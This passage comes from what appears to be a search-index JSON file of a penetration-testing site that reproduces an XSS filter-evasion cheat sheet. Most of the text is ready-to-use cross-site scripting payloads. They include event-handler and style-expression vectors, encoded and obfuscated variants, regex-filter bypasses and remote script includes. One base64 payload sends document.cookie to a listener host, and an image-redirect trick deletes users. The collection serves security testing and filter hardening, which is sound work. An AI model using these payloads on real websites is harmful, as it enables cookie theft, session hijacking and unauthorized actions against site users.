a=\"\\\\\\\\\";alert('XSS');//\";</SCRIPT> which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire. The XSS locator uses this method.: `\\\";alert('XSS');//` An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own: </ script >< script > alert ( 'XSS' );</ script >", "title": "Escaping JavaScript Escapes"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#end-title-tag", "text": "This is a simple XSS vector that closes <TITLE> tags, which can encapsulate the malicious cross site scripting attack: </ TITLE >< SCRIPT > alert ( \"XSS\" );</ SCRIPT >", "title": "End Title Tag"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#input-image", "text": "< input type = \"IMAGE\" src = \"javascript:alert('XSS');\" />", "title": "INPUT Image"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#body-image", "text": "< body background = \"javascript:alert('XSS')\" ></ body >", "title": "BODY Image"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-dynsrc", "text": "< img DYNSRC = \"javascript:alert('XSS')\" />", "title": "IMG Dynsrc"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-lowsrc", "text": "< img LOWSRC = \"javascript:alert('XSS')\" />", "title": "IMG Lowsrc"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#list-style-image", "text": "Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector: < STYLE > li { list-style-image : url ( \"javascript:alert('XSS')\" );}</ STYLE >< UL >< LI > XSS </ br >", "title": "List-style-image"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#vbscript-in-an-image", "text": "< img src = 'vbscript:msgbox(\"XSS\")' />", "title": "VBscript in an Image"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#livescript-older-versions-of-netscape-only", "text": "< img src = \"livescript:[code]\" />", "title": "Livescript (older versions of Netscape only)"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#svg-object-tag", "text": "< svg / onload = alert('XSS') >", "title": "SVG Object Tag"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#ecmascript-6", "text": "Set.constructor`alert\\x28document.domain\\x29", "title": "ECMAScript 6"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#body-tag", "text": "Method doesn't require using any variants of javascript: or <SCRIPT... to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign ( onload= != onload = ): < BODY ONLOAD = alert('XSS') >", "title": "BODY Tag"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#event-handlers", "text": "It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates. FSCommand() (attacker can use this when executed from within an embedded Flash object) onAbort() (when user aborts the loading of an image) onActivate() (when object is set as the active element) onAfterPrint() (activates after user prints or previews print job) onAfterUpdate() (activates on data object after updating data in the source object) onBeforeActivate() (fires before the object is set as the active element) onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand(\"Copy\") function) onBeforeCut() (attacker executes the attack string right before a selection is cut) onBeforeDeactivate() (fires right after the activeElement is changed from the current object) onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected) onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand(\"Paste\") function) onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand(\"Print\") function). onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent) onBeforeUpdate() (activates on data object before updating data in the source object) onBegin() (the onbegin event fires immediately when the element's timeline begins) onBlur() (in the case where another popup is loaded and window looses focus) onBounce() (fires when the behavior property of the marquee object is set to \"alternate\" and the contents of the marquee reach one side of the window) onCellChange() (fires when data changes in the data provider) onChange() (select, text, or TEXTAREA field loses focus and its value has been modified) onClick() (someone clicks on a form) onContextMenu() (user would need to right click on attack area) onControlSelect() (fires when the user is about to make a control selection of the object) onCopy() (user needs to copy something or it can be exploited using the execCommand(\"Copy\") command) onCut() (user needs to copy something or it can be exploited using the execCommand(\"Cut\") command) onDataAvailable() (user would need to change data in an element, or attacker could perform the same function) onDataSetChanged() (fires when the data set exposed by a data source object changes) onDataSetComplete() (fires to indicate that all data is available from the data source object) onDblClick() (user double-clicks a form element or a link) onDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document) onDrag() (requires that the user drags an object) onDragEnd() (requires that the user drags an object) onDragLeave() (requires that the user drags an object off a valid location) onDragEnter() (requires that the user drags an object into a valid location) onDragOver() (requires that the user drags an object into a valid location) onDragDrop() (user drops an object (e.g. file) onto the browser window) onDragStart() (occurs when user starts drag operation) onDrop() (user drops an object (e.g. file) onto the browser window) onEnd() (the onEnd event fires when the timeline ends. onError() (loading of a document or image causes an error) onErrorUpdate() (fires on a databound object when an error occurs while updating the associated data in the data source object) onFilterChange() (fires when a visual filter completes state change) onFinish() (attacker can create the exploit when marquee is finished looping) onFocus() (attacker executes the attack string when the window gets focus) onFocusIn() (attacker executes the attack string when window gets focus) onFocusOut() (attacker executes the attack string when window looses focus) onHashChange() (fires when the fragment identifier part of the document's current address changed) onHelp() (attacker executes the attack string when users hits F1 while the window is in focus) onInput() (the text content of an element is changed through the user interface) onKeyDown() (user depresses a key) onKeyPress() (user presses or holds down a key) onKeyUp() (user releases a key) onLayoutComplete() (user would have to print or print preview) onLoad() (attacker executes the attack string after the window loads) onLoseCapture() (can be exploited by the releaseCapture() method) onMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing) onMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem) onMessage() (fire when the document received a message) onMouseDown() (the attacker would need to get the user to click on an image) onMouseEnter() (cursor moves over an object or area) onMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again) onMouseMove() (the attacker would need to get the user to mouse over an image or table) onMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again) onMouseOver() (cursor moves over an object or area) onMouseUp() (the attacker would need to get the user to click on an image) onMouseWheel() (the attacker would need to get the user to use their mouse wheel) onMove() (user or attacker would move the page) onMoveEnd() (user or attacker would move the page) onMoveStart() (user or attacker would move the page) onOffline() (occurs if the browser is working in online mode and it starts to work offline) onOnline() (occurs if the browser is working in offline mode and it starts to work online) onOutOfSync() (interrupt the element's ability to play its media as defined by the timeline) onPaste() (user would need to paste or attacker could use the execCommand(\"Paste\") function) onPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element) onPopState() (fires when user navigated the session history) onProgress() (attacker would use this as a flash movie was loading) onPropertyChange() (user or attacker would need to change an element property) onReadyStateChange() (user or attacker would need to change an element property) onRedo() (user went forward in undo transaction history) onRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle) onReset() (user or attacker resets a form) onResize() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT> ) onResizeEnd() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT> ) onResizeStart() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT> ) onResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element) onReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward) onRowsEnter() (user or attacker would need to change a row in a data source) onRowExit() (user or attacker would need to change a row in a data source) onRowDelete() (user or attacker would need to delete a row in a data source) onRowInserted() (user or attacker would need to insert a row in a data source) onScroll() (user would need to scroll, or attacker could use the scrollBy() function) onSeek() (the onreverse event fires when the timeline is set to play in any direction other than forward) onSelect() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\"); ) onSelectionChange() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\"); ) onSelectStart() (user needs to select some text - attacker could auto initialize with something like: window.document.execCommand(\"SelectAll\"); ) onStart() (fires at the beginning of each marquee loop) onStop() (user would need to press the stop button or leave the webpage) onStorage() (storage area changed) onSyncRestored() (user interrupts the element's ability to play its media as defined by the timeline to fire) onSubmit() (requires attacker or user submits a form) onTimeError() (user or attacker sets a time property, such as dur, to an invalid value) onTrackChange() (user or attacker changes track in a playList) onUndo() (user went backward in undo transaction history) onUnload() (as the user clicks any link or presses the back button or attacker forces a click) onURLFlip() (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file) seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)", "title": "Event Handlers"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#bgsound", "text": "< bgsound SRC = \"javascript:alert('XSS');\" ></ bgsound >", "title": "BGSOUND"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#javascript-includes", "text": "< br SIZE = \"&{alert('XSS')}\" />", "title": "&amp; JavaScript includes"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-sheet", "text": "< link rel = \"stylesheet\" href = \"javascript:alert('XSS');\" />", "title": "STYLE sheet"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#remote-style-sheet", "text": "Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page: < link rel = \"stylesheet\" href = \"http://xss.rocks/xss.css\" />", "title": "Remote style sheet"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#remote-style-sheet-part-2", "text": "This works the same as above, but uses a <STYLE> tag instead of a <LINK> tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end </STYLE> tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world: < style > @ import 'http://xss.rocks/xss.css' ; </ style >", "title": "Remote style sheet part 2"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#remote-style-sheet-part-3", "text": "This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http://xss.rocks/xss.css>; REL=stylesheet ) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox: < meta http-equiv = \"Link\" content = \"<http://xss.rocks/xss.css>; REL=stylesheet\" />", "title": "Remote style sheet part 3"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#remote-style-sheet-part-4", "text": "This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast majority of sites: < style > BODY { -moz- binding : url ( 'http://xss.rocks/xssmoz.xml#xss' ); } </ style >", "title": "Remote style sheet part 4"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-tags-with-broken-up-javascript-for-xss", "text": "This XSS at times sends IE into an infinite loop of alerts: < style > @ im \\ port '\\ja\\vasc\\ript:alert(\"XSS\")' ; </ style >", "title": "STYLE Tags with Broken-up JavaScript for XSS"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-attribute-using-a-comment-to-break-up-expression", "text": "Created by Roman Ivanov < img style = \"xss:expr/*XSS*/ession(alert('XSS'))\" />", "title": "STYLE Attribute using a Comment to Break-up Expression"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-style-with-expression", "text": "This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop: exp/* < a style = 'no\\xss:noxss(\"*//*\"); xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))' ></ a >", "title": "IMG STYLE with Expression"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-tag-older-versions-of-netscape-only", "text": "< style type = \"text/javascript\" > alert ( 'XSS' ); </ style >", "title": "STYLE Tag (Older versions of Netscape only)"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-tag-using-background-image", "text": "< style > . XSS { background-image : url ( \"javascript:alert('XSS')\" ); }</ style >< a class = \"XSS\" ></ a >", "title": "STYLE Tag using Background-image"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#style-tag-using-background", "text": "< style type = \"text/css\" > BODY { background : url ( \"javascript:alert('XSS')\" ); }</ style > ` ` < style type = \"text/css\" > BODY { background : url ( \"<javascript:alert>('XSS')\" ); } </ style >", "title": "STYLE Tag using Background"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#anonymous-html-with-style-attribute", "text": "IE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter: < XSS STYLE = \"xss:expression(alert('XSS'))\" ></ XSS >", "title": "Anonymous HTML with STYLE Attribute"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#local-htc-file", "text": "This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute: < XSS STYLE = \"behavior: url(xss.htc);\" ></ XSS >", "title": "Local htc File"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#us-ascii-encoding", "text": "US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding. `\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be`", "title": "US-ASCII Encoding"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#meta", "text": "The odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs: < meta http-equiv = \"refresh\" content = \"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\" />", "title": "META"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#iframe", "text": "If iframes are allowed there are a lot of other XSS problems as well: < iframe src = \"javascript:alert('XSS');\" ></ iframe >", "title": "IFRAME"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#iframe-event-based", "text": "IFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross) < iframe src = \"#\" onmouseover = \"alert(document.cookie)\" ></ iframe >", "title": "IFRAME Event Based"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#frame", "text": "Frames have the same sorts of XSS problems as iframes < FRAMESET >< FRAME SRC = \"javascript:alert('XSS');\" ></ FRAMESET >", "title": "FRAME"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#table", "text": "< table BACKGROUND = \"javascript:alert('XSS')\" ></ table >", "title": "TABLE"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#td", "text": "Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors: < table > < td BACKGROUND = \"javascript:alert('XSS')\" ></ td > </ table >", "title": "TD"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div", "text": "", "title": "DIV"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div-background-image", "text": "< div style = \"background-image: url(javascript:alert('XSS'))\" ></ div >", "title": "DIV Background-image"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div-background-image-with-unicoded-xss-exploit", "text": "This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail: < div style = \"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\" ></ div >", "title": "DIV Background-image with Unicoded XSS Exploit"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div-background-image-plus-extra-characters", "text": "Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279): < div style = \"background-image: url(javascript:alert('XSS'))\" ></ div >", "title": "DIV Background-image Plus Extra Characters"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#div-expression", "text": "A variant of this was effective against a real world cross site scripting filter using a newline between the colon and \"expression\": < div style = \"width: expression(alert('XSS'));\" ></ div >", "title": "DIV Expression"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#downlevel-hidden-block", "text": "Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job: <!--[if gte IE 4]> <script> alert('XSS'); </script> <![endif]-->", "title": "Downlevel-Hidden Block"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#base-tag", "text": "Works in IE and Netscape 8.1 in safe mode. You need the // to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like images/image.jpg rather than full paths. If the path includes a leading forward slash like /images/image.jpg you can remove one slash from this vector (as long as there are two to begin the comment this will work): < base href = \"javascript:alert('XSS');//\" />", "title": "BASE Tag"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#object-tag", "text": "If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS: < object type = \"text/x-scriptlet\" data = \"http://xss.rocks/scriptlet.html\" ></ object >", "title": "OBJECT Tag"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#embed-svg-which-contains-xss-vector", "text": "This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one. < EMBED SRC = \"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type = \"image/svg+xml\" AllowScriptAccess = \"always\" ></ EMBED >", "title": "EMBED SVG Which Contains XSS Vector"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#using-actionscript-inside-flash-for-obfuscation", "text": "a = 'get' ; b = 'URL(\"' ; c = 'javascript:' ; d = \"alert('XSS');\\\")\" ; eval ( a + b + c + d );", "title": "Using ActionScript Inside Flash for Obfuscation"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xml-data-island-with-cdata-obfuscation", "text": "This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo: <XML ID= \"xss\" ><I><B><IMG SRC= \"javas<!-- -->cript:alert('XSS')\" ></B></I></XML> <SPAN DATASRC= \"#xss\" DATAFLD= \"B\" DATAFORMATAS= \"HTML\" ></SPAN>", "title": "XML Data Island with CDATA Obfuscation"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island", "text": "This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here: <XML SRC= \"xsstest.xml\" ID= I ></XML> <SPAN DATASRC= #I DATAFLD= C DATAFORMATAS= HTML ></SPAN>", "title": "Locally hosted XML with embedded JavaScript that is generated using an XML data island"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#htmltime-in-xml", "text": "This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work: < html > < body > < ?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"> < ?import namespace=\"t\" implementation=\"#default#time2\"> < t:set attributeName = \"innerHTML\" to = \"XSS <script defer> alert('XSS'); </script> \" > </ body > </ html >", "title": "HTML+TIME in XML"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js", "text": "You can rename your JavaScript file to an image as an XSS vector: < script src = \"http://xss.rocks/xss.jpg\" ></ script >", "title": "Assuming you can only fit in a few characters and it filters against .js"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#ssi-server-side-includes", "text": "This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues: <!-- # exec cmd = \"/bin/echo '<SCR'\" --> <!-- # exec cmd = \"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\" -->", "title": "SSI (Server Side Includes)"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#php", "text": "Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues: <? echo ( '<SCR)' ; echo ( 'IPT>alert(\"XSS\")</SCRIPT>' ); ?>", "title": "PHP"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-embedded-commands", "text": "This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors: < img src = \"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\" />", "title": "IMG Embedded Commands"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-embedded-commands-part-ii", "text": "This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <IMG SRC=\"httx://badguy.com/a.jpg\"> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this): Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser", "title": "IMG Embedded Commands part II"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#cookie-manipulation", "text": "Admittedly this is pretty obscure but I have seen a few examples where <META is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...): < meta http-equiv = \"Set-Cookie\" content = \"USERID=<SCRIPT>alert('XSS')</SCRIPT>\" />", "title": "Cookie Manipulation"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#utf-7-encoding", "text": "If the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.: < head > < meta http-equiv = \"CONTENT-TYPE\" content = \"text/html; charset=UTF-7\" /></ head > +ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`", "title": "UTF-7 Encoding"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xss-using-html-quote-encapsulation", "text": "This was tested in IE, your mileage may vary. For performing XSS on sites that allow <SCRIPT> but don't allow <SCRIPT SRC... by way of a regex filter /\\<script\\[^\\>\\]+src/i : < script a = \">\" src = \"httx://xss.rocks/xss.js\" ></ script > For performing XSS on sites that allow <SCRIPT> but don't allow \\<script src... by way of a regex filter /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i (this is an important one, because I've seen this regex in the wild): < script =\" > \" src=\" httx : //xss.rocks/xss.js\"> </ script > Another XSS to evade the same filter, /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i : < SCRIPT a = \">\" '' SRC = \"httx://xss.rocks/xss.js\" ></ SCRIPT > Yet another XSS to evade the same filter, /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i . I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow <SCRIPT> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <SCRIPT> tags): < SCRIPT \" a = '>' \" SRC = \"httx://xss.rocks/xss.js\" ></ SCRIPT > And one last XSS attack to evade, /\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i using grave accents (again, doesn't work in Firefox): < script a = \"`\" > ` SRC=\"httx://xss.rocks/xss.js\"> </ script > Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly: < script a = \">'>\" src = \"httx://xss.rocks/xss.js\" ></ script > This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content: < SCRIPT > document . write ( \"<SCRI\" );</ SCRIPT > PT SRC=\"httx://xss.rocks/xss.js\"> </ SCRIPT >", "title": "XSS Using HTML Quote Encapsulation"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#url-string-evasion", "text": "Assuming http://www.google.com/ is programmatically disallowed:", "title": "URL String Evasion"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#ip-versus-hostname", "text": "< a href = \"http://66.102.7.147/\" > XSS </ a >", "title": "IP Versus Hostname"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#url-encoding", "text": "< a href = \"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\" > XSS </ a >", "title": "URL Encoding"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#dword-encoding", "text": "Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details: < a href = \"http://1113982867/\" > XSS </ a >", "title": "DWORD Encoding"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#hex-encoding", "text": "The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required): < a href = \"http://0x42.0x0000066.0x7.0x93/\" > XSS </ a >", "title": "Hex Encoding"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#octal-encoding", "text": "Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...: < a href = \"http://0102.0146.0007.00000223/\" > XSS </ a >", "title": "Octal Encoding"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#base64-encoding", "text": "< img onload = \"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\" />", "title": "Base64 Encoding"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#mixed-encoding", "text": "Let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes: < a href = \"h tt p://6 6.000146.0x7.147/\" > XSS </ a >", "title": "Mixed Encoding"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#protocol-resolution-bypass", "text": "// translates to http:// which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like (ht|f)tp(s)?:// (thanks to Ozh for part of this one). You can also change the // to \\\\\\\\ . You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL. < a href = \"//www.google.com/\" > XSS </ a >", "title": "Protocol Resolution Bypass"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#google-feeling-lucky-part-1", "text": "Firefox uses Google's \"feeling lucky\" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's keyword: protocol. You can concatenate several keywords by using something like the following keyword:XSS+RSnake for instance. This no longer works within Firefox as of 2.0. < a href = \"//google\" > XSS </ a >", "title": "Google \"feeling lucky\" part 1"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#google-feeling-lucky-part-2", "text": "This uses a very tiny trick that appears to work Firefox only, because of it's implementation of the \"feeling lucky\" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0: < a href = \"http://ha.ckers.org@google\" > XSS </ a >", "title": "Google \"feeling lucky\" part 2"}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#google-feeling-lucky-part-3", "text": "This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the \"feeling lucky\" function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case \"google\"): < a href = 